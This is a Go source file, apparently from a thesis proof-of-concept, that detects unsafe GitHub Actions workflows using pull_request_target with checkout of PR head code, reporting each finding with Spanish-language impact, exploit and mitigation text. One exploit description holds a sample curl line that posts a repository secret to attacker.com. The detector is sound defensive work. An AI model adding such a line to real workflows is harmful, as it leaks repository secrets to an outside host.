package analyzer

import (
	"regexp"

	"github.com/cmalvaceda/tesis-poc/pkg/models"
)

type PullRequestTargetDetector struct{}

func NewPullRequestTargetDetector() *PullRequestTargetDetector {
	return &PullRequestTargetDetector{}
}

func (d *PullRequestTargetDetector) Detect(filePath string, lines []string, workflowData map[string]interface{}) []models.Vulnerability {
	var vulnerabilities []models.Vulnerability

	hasPullRequestTarget := false

	if on, ok := workflowData["on"].(interface{}); ok {
		if prTarget, ok := on.(string); ok && prTarget == "pull_request_target" {
			hasPullRequestTarget = true
		}

		if events, ok := on.([]interface{}); ok {
			for _, event := range events {
				if eventStr, ok := event.(string); ok && eventStr == "pull_request_target" {
					hasPullRequestTarget = true
					break
				}
			}
		}

		if events, ok := on.(map[string]interface{}); ok {
			if _, ok := events["pull_request_target"]; ok {
				hasPullRequestTarget = true
			}
		}
	}

	if hasPullRequestTarget {
		hasCheckout := false
		checkoutWithRef := false
		hasScriptExecution := false

		checkoutPattern := regexp.MustCompile(`uses:\s+actions/checkout@`)
		refSafePattern := regexp.MustCompile(`ref:\s*\$\{\{\s*github\.event\.pull_request\.base\.sha\s*\}\}`)
		refUnsafePattern := regexp.MustCompile(`ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.`)
		scriptRunPattern := regexp.MustCompile(`run:\s*`)

		for i, line := range lines {
			if checkoutPattern.MatchString(line) {
				hasCheckout = true

				for j := max(0, i-5); j < min(len(lines), i+5); j++ {
					if refSafePattern.MatchString(lines[j]) {
						checkoutWithRef = true
						break
					}
					if refUnsafePattern.MatchString(lines[j]) {
						hasCheckout = true
						checkoutWithRef = false

						vulnerabilities = append(vulnerabilities, models.Vulnerability{
							Type:        string(models.UnsafePullRequestTarget),
							Description: "Checkout del código de un PR en un workflow con pull_request_target usando una referencia insegura",
							Severity:    string(models.SeverityHigh),
							File:        filePath,
							Line:        j + 1,
							Details:     lines[j],
							Impact: "Esta configuración permite que código arbitrario de PRs externos se ejecute con acceso " +
								"a secretos del repositorio, creando un riesgo grave de robo de secretos y compromiso del repositorio.",
							Exploit: "Un atacante puede enviar un PR con código malicioso que se ejecutará en el contexto del workflow " +
								"con pull_request_target. Por ejemplo, podrían agregar código que extraiga secretos y los envíe a un " +
								"servidor externo.",
							Mitigation: "Si necesitas hacer checkout del código del PR, usa la referencia base (segura): \n" +
								"`ref: ${{ github.event.pull_request.base.sha }}`\n" +
								"No ejecutes ningún código del PR.",
							References: []string{
								"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
								"https://docs.github.com/es/actions/using-workflows/events-that-trigger-workflows#pull_request_target",
								"https://github.blog/2020-08-03-github-actions-improvements-for-fork-and-pull-request-workflows/",
								"https://github.blog/2021-02-02-avoiding-github-actions-attacks/",
							},
						})
						break
					}
				}
			}

			if scriptRunPattern.MatchString(line) {
				hasScriptExecution = true
			}
		}

		if hasCheckout && !checkoutWithRef && hasScriptExecution {
			vulnerabilities = append(vulnerabilities, models.Vulnerability{
				Type:        string(models.UnsafePullRequestTarget),
				Description: "Workflow con pull_request_target ejecuta código potencialmente inseguro",
				Severity:    string(models.SeverityHigh),
				File:        filePath,
				Line:        0,
				Details:     "Este workflow se activa con pull_request_target, hace checkout sin especificar una ref segura, y ejecuta scripts",
				Impact: "Una vulnerabilidad extremadamente grave que permite a un atacante ejecutar código arbitrario " +
					"en el contexto privilegiado de un workflow, con acceso a todos los secretos del repositorio. " +
					"Esto puede llevar a la comprometer completamente el repositorio y todos los sistemas conectados.",
				Exploit: "Caso real: En 2021, múltiples repositorios populares fueron vulnerables a este ataque. Un atacante " +
					"podía enviar un PR que modificaba los archivos del workflow para exfiltrar secretos. Por ejemplo, " +
					"agregando `run: curl -d \"${{ secrets.SUPER_SECRET }}\" https://attacker.com/`.",
				Mitigation: "1. No usar pull_request_target si es posible\n" +
					"2. Si es necesario, nunca hacer checkout del código del PR\n" +
					"3. Si absolutamente necesitas hacer checkout, usa solo `github.event.pull_request.base.sha` y nunca ejecutes código del PR\n" +
					"4. Implementar permisos mínimos para el token GITHUB_TOKEN",
				References: []string{
					"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/",
					"https://github.blog/2020-08-03-github-actions-improvements-for-fork-and-pull-request-workflows/",
					"https://docs.github.com/es/actions/using-workflows/events-that-trigger-workflows#pull_request_target",
					"https://blog.teddykatz.com/2021/03/17/github-actions-write-access.html",
				},
			})
		}
	}

	return vulnerabilities
}
